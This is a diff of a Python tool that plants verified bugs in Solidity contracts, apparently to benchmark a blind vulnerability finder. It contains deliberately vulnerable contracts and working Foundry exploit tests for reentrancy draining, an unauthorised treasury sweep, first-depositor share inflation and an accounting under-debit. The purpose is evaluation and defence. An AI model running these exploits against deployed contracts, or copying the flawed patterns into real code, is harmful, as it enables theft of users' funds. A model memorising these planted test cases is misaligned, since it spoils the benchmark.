@@ -6,24 +6,25 @@ correlated with the finder's blind spots), we MODEL the bug symbolically and let
 z3 prove it is real BEFORE any Solidity exists — the project's z3-first rule.
 
 A BugSpec is a typed node:
-    invariant   : a predicate that must always hold (e.g. conservation)
-    correct/def : two renderings of one operation — sound, and defect-injected
-    witness      : the action sequence that drives the defect to break the invariant
+    invariant      : a predicate that must always hold
+    symbolic_check : a callable that uses z3 to prove correct ⇒ invariant holds
+                     AND defect ⇒ invariant violable.  None = no z3 model yet
+                     (forge-only: the concrete PoC is still a sound oracle, but we
+                     do not claim a symbolic proof — reported honestly).
+    contract       : a realistic Target.sol carrying the verified defect
+    poc            : a Foundry PoC built from the witness
 
-Pipeline per spec:
-    1. SYMBOLIC GATE (z3): prove correct ⇒ invariant holds (UNSAT to break),
-       and defective ⇒ invariant violable (SAT, z3 returns the witness).
-       Only specs passing BOTH are real bugs — proven, not asserted.
-    2. RENDER: emit a realistic Target.sol carrying the verified defect + a PoC
-       built from the witness.
-    3. CONFIRM (forge): run the PoC concretely. Symbolic proof AND execution.
+Pipeline per spec (see gan_symbolic.py):
+    1. SYMBOLIC GATE (z3): correct holds, defect breaks  [if symbolic_check present]
+    2. CONFIRM (forge): run the PoC concretely — execution, not opinion
+    3. finder faces Target.sol BLIND
 
-The finder then faces Target.sol blind. Because the bug was constructed by a
-non-LLM process, the finder shares no authoring bias with it.
-
-This v0 ships ONE node — the accounting/conservation class — reusing the already
-proven `conservation_invariant` z3 template. Subtlety and more classes (reentrancy,
-donation inflation, access control) are the growth axis.
+z3 proof status by node:
+    accounting_underdebit  — z3 (conservation template)
+    reentrancy_cei         — z3 (credit-limit under CEI-violating ordering)
+    access_control_sweep   — z3 (effect ⇒ authorized)
+    donation_inflation     — forge-only (integer-division share rounding; no clean
+                             z3 model of the *fix* yet — growth axis)
 """
 
 from __future__ import annotations
@@ -33,6 +34,7 @@ import os
 import subprocess
 import sys
 from dataclasses import dataclass
+from typing import Callable, Optional
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 sys.path.insert(0, HERE)
@@ -50,36 +52,79 @@ FORGE = os.path.expanduser("~/.foundry/bin/forge")
 class BugSpec:
     name: str
     bug_class: str
-    invariant: str  # human-readable; what must hold
-    template_kind: str  # z3 template that models this class
-    contract: str  # rendered Target.sol carrying the defect
-    poc: str  # Foundry PoC realising the witness
+    invariant: str
+    contract: str
+    poc: str
+    symbolic_check: Optional[Callable[[], dict]] = None  # None = forge-only
 
 
 # --------------------------------------------------------------------------- #
-# z3 symbolic gate (reuses the proven conservation template)
+# symbolic gates (z3)
 # --------------------------------------------------------------------------- #
-def _run_z3(kind: str, params: dict) -> dict:
-    src = render_z3_template(kind, params)
-    proc = subprocess.run(
-        [sys.executable, "-c", src], capture_output=True, text=True, timeout=60
-    )
-    if proc.returncode != 0:
-        return {"status": "error", "explanation": proc.stderr.strip()[:200]}
-    return json.loads(proc.stdout.strip())
-
-
 def verify_symbolic(spec: BugSpec) -> dict:
-    """Prove the defect is real at the model level: correct holds, defective breaks."""
-    correct = _run_z3(spec.template_kind, {"preserves_sum": True})
-    defective = _run_z3(spec.template_kind, {"preserves_sum": False})
-    sound_baseline = correct.get("status") == "unsat"
-    defect_breaks = defective.get("status") == "sat"
+    """Prove the defect real at the model level. verified: True/False/None(forge-only)."""
+    if spec.symbolic_check is None:
+        return {"verified": None, "forge_only": True}
+    return spec.symbolic_check()
+
+
+def _sym_conservation() -> dict:
+    """Accounting class via the proven conservation template (z3 over arithmetic)."""
+
+    def run(preserves_sum: bool) -> str:
+        src = render_z3_template(
+            "conservation_invariant", {"preserves_sum": preserves_sum}
+        )
+        out = subprocess.run(
+            [sys.executable, "-c", src], capture_output=True, text=True, timeout=60
+        )
+        return json.loads(out.stdout.strip()).get("status", "error")
+
+    sound = run(True) == "unsat"
+    breaks = run(False) == "sat"
     return {
-        "verified": sound_baseline and defect_breaks,
-        "sound_baseline": sound_baseline,  # correct ⇒ invariant holds
-        "defect_breaks": defect_breaks,  # defective ⇒ invariant violable
-        "witness": defective.get("counterexample"),
+        "verified": sound and breaks,
+        "sound_baseline": sound,
+        "defect_breaks": breaks,
+    }
+
+
+def _sym_reentrancy() -> dict:
+    """CEI ordering: with the state-zeroing AFTER the external call, a reentrant
+    second read sees the full credit, so the attacker extracts 2× their deposit."""
+    import z3
+
+    C = z3.Int("C")  # attacker credit (= their deposit)
+    extracted_buggy = C + C  # both withdraws read credit before it is zeroed
+    extracted_correct = C + 0  # zeroing precedes the second read
+    s = z3.Solver()
+    s.add(C > 0, extracted_buggy > C)  # invariant: extracted <= deposit
+    breaks = s.check() == z3.sat
+    s2 = z3.Solver()
+    s2.add(C > 0, extracted_correct > C)
+    sound = s2.check() == z3.unsat
+    return {
+        "verified": breaks and sound,
+        "sound_baseline": sound,
+        "defect_breaks": breaks,
+    }
+
+
+def _sym_access_control() -> dict:
+    """A value-moving effect must imply the caller was authorized."""
+    import z3
+
+    authorized = z3.Bool("authorized")
+    s = z3.Solver()
+    s.add(z3.Not(authorized), z3.BoolVal(True))  # buggy: effect fires regardless
+    breaks = s.check() == z3.sat
+    s2 = z3.Solver()
+    s2.add(z3.Not(authorized), authorized)  # correct: effect == authorized
+    sound = s2.check() == z3.unsat
+    return {
+        "verified": breaks and sound,
+        "sound_baseline": sound,
+        "defect_breaks": breaks,
     }
 
 
@@ -110,11 +155,8 @@ def confirm_forge(spec: BugSpec, test_name: str = "Planted.t.sol") -> tuple[bool
 
 
 # --------------------------------------------------------------------------- #
-# v0 catalog — accounting / conservation
+# catalog
 # --------------------------------------------------------------------------- #
-# The defect: transfer() under-debits the sender (debits amount/2) while crediting
-# the receiver the full amount → sum(balances) grows above totalSupply = value minted.
-# Symbolically this IS preserves_sum=False on the conservation template.
 _ACCOUNTING_TARGET = """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
@@ -130,8 +172,7 @@ contract Target {
 
     function transfer(address to, uint256 amount) external returns (bool) {
         require(balanceOf[msg.sender] >= amount, "insufficient");
-        // BUG: sender is debited only half of what the receiver is credited,
-        // so the conservation invariant sum(balanceOf) == totalSupply breaks.
+        // BUG: sender debited only half of what receiver is credited.
         balanceOf[msg.sender] -= amount / 2;
         balanceOf[to] += amount;
         return true;
@@ -152,12 +193,10 @@ contract PlantedPoC is Test {
 
     function setUp() public {
         t = new Target();
-        // give the attacker some balance to move
         t.transfer(attacker, 1000 ether);
     }
 
     function test_exploit() public {
-        // Witness: a single transfer mints value — sum(balances) exceeds totalSupply.
         uint256 supply = t.totalSupply();
         uint256 before = t.balanceOf(address(this)) + t.balanceOf(attacker)
             + t.balanceOf(sink);
@@ -165,9 +204,183 @@ contract PlantedPoC is Test {
         t.transfer(sink, 1000 ether);
         uint256 afterSum = t.balanceOf(address(this)) + t.balanceOf(attacker)
             + t.balanceOf(sink);
-        // conservation broken: value was created from nothing
         assertGt(afterSum, before, "no value minted");
         assertGt(afterSum, supply, "sum still within supply");
+    }
+}
+"""
+
+_REENTRANCY_TARGET = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/// An ETH vault. Each user can withdraw their own credit. Looks fine.
+contract Target {
+    mapping(address => uint256) public credit;
+
+    function deposit() external payable {
+        credit[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint256 amt = credit[msg.sender];
+        require(amt > 0, "no credit");
+        // BUG: external call happens BEFORE the balance is zeroed (CEI violation).
+        (bool ok, ) = msg.sender.call{value: amt}("");
+        require(ok, "send failed");
+        credit[msg.sender] = 0;
+    }
+}
+"""
+
+_REENTRANCY_POC = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import {Target} from "../src/Target.sol";
+
+contract Attacker {
+    Target t;
+    uint256 public taken;
+
+    constructor(Target _t) {
+        t = _t;
+    }
+
+    function attack() external payable {
+        t.deposit{value: msg.value}();
+        t.withdraw();
+    }
+
+    receive() external payable {
+        taken += msg.value;
+        if (address(t).balance >= 1 ether) {
+            t.withdraw();
+        }
+    }
+}
+
+contract PlantedPoC is Test {
+    Target t;
+
+    function setUp() public {
+        t = new Target();
+        // other honest users have funds in the vault
+        address honest = makeAddr("honest");
+        vm.deal(honest, 5 ether);
+        vm.prank(honest);
+        t.deposit{value: 5 ether}();
+    }
+
+    function test_exploit() public {
+        Attacker a = new Attacker(t);
+        vm.deal(address(this), 1 ether);
+        a.attack{value: 1 ether}();
+        // attacker deposited 1 ether but drained more via reentrancy
+        assertGt(a.taken(), 1 ether, "no reentrant overdraw");
+    }
+}
+"""
+
+_ACCESS_TARGET = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/// A treasury. Funds can be swept to a destination. owner is tracked but...
+contract Target {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function deposit() external payable {}
+
+    // BUG: missing access control — any caller can sweep the whole balance.
+    function sweep(address payable to) external {
+        to.transfer(address(this).balance);
+    }
+}
+"""
+
+_ACCESS_POC = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import {Target} from "../src/Target.sol";
+
+contract PlantedPoC is Test {
+    Target t;
+
+    function setUp() public {
+        t = new Target();
+        vm.deal(address(this), 10 ether);
+        t.deposit{value: 10 ether}();
+    }
+
+    function test_exploit() public {
+        address attacker = makeAddr("attacker");
+        vm.prank(attacker);
+        t.sweep(payable(attacker));
+        assertEq(attacker.balance, 10 ether, "attacker did not sweep treasury");
+    }
+}
+"""
+
+_DONATION_TARGET = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/// A share-based ETH vault. Shares = deposit * totalShares / assetsBefore.
+contract Target {
+    mapping(address => uint256) public shares;
+    uint256 public totalShares;
+
+    function deposit() external payable returns (uint256 minted) {
+        uint256 assetsBefore = address(this).balance - msg.value;
+        if (totalShares == 0) {
+            minted = msg.value;
+        } else {
+            // BUG: no minimum-shares / virtual-offset guard → first depositor can
+            // donate to inflate assetsBefore so a later deposit rounds to 0 shares.
+            minted = (msg.value * totalShares) / assetsBefore;
+        }
+        shares[msg.sender] += minted;
+        totalShares += minted;
+    }
+
+    // lets the attacker donate raw ETH to inflate the share price
+    receive() external payable {}
+}
+"""
+
+_DONATION_POC = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import {Target} from "../src/Target.sol";
+
+contract PlantedPoC is Test {
+    Target t;
+
+    function setUp() public {
+        t = new Target();
+    }
+
+    function test_exploit() public {
+        address attacker = makeAddr("attacker");
+        address victim = makeAddr("victim");
+        vm.deal(attacker, 2 ether);
+        vm.deal(victim, 1 ether);
+
+        // attacker seeds 1 share for 1 wei, then donates to inflate the price
+        vm.prank(attacker);
+        t.deposit{value: 1}();
+        vm.prank(attacker);
+        (bool ok, ) = address(t).call{value: 1 ether}("");
+        require(ok, "donation failed");
+
+        // victim deposits real money and receives ZERO shares (rounded down)
+        vm.prank(victim);
+        uint256 minted = t.deposit{value: 1 ether}();
+        assertEq(minted, 0, "victim got shares (no rounding loss)");
     }
 }
 """
@@ -177,9 +390,33 @@ CATALOG = [
         name="accounting_underdebit",
         bug_class="broken accounting / conservation",
         invariant="sum(balanceOf) == totalSupply",
-        template_kind="conservation_invariant",
         contract=_ACCOUNTING_TARGET,
         poc=_ACCOUNTING_POC,
+        symbolic_check=_sym_conservation,
+    ),
+    BugSpec(
+        name="reentrancy_cei",
+        bug_class="reentrancy (CEI violation)",
+        invariant="a user cannot withdraw more than they deposited",
+        contract=_REENTRANCY_TARGET,
+        poc=_REENTRANCY_POC,
+        symbolic_check=_sym_reentrancy,
+    ),
+    BugSpec(
+        name="access_control_sweep",
+        bug_class="missing access control",
+        invariant="only the owner can move treasury funds",
+        contract=_ACCESS_TARGET,
+        poc=_ACCESS_POC,
+        symbolic_check=_sym_access_control,
+    ),
+    BugSpec(
+        name="donation_inflation",
+        bug_class="first-depositor share-price inflation",
+        invariant="a non-zero deposit must mint non-zero shares",
+        contract=_DONATION_TARGET,
+        poc=_DONATION_POC,
+        symbolic_check=None,  # forge-only for now
     ),
 ]
 
@@ -188,14 +425,17 @@ def _self_test() -> None:
     for spec in CATALOG:
         print(f"\n=== {spec.name} ({spec.bug_class}) ===")
         sym = verify_symbolic(spec)
-        print(
-            f"  symbolic: verified={sym['verified']} "
-            f"(sound_baseline={sym['sound_baseline']}, defect_breaks={sym['defect_breaks']})"
-        )
+        if sym["verified"] is None:
+            print("  symbolic: (forge-only — no z3 model yet)")
+        else:
+            print(
+                f"  symbolic: verified={sym['verified']} "
+                f"(sound_baseline={sym['sound_baseline']}, defect_breaks={sym['defect_breaks']})"
+            )
         ok, out = confirm_forge(spec)
         print(f"  forge:    planted bug PASS={ok}")
         if not ok:
-            print("\n".join(out.strip().splitlines()[-12:]))
+            print("\n".join(out.strip().splitlines()[-14:]))
 
 
 if __name__ == "__main__":
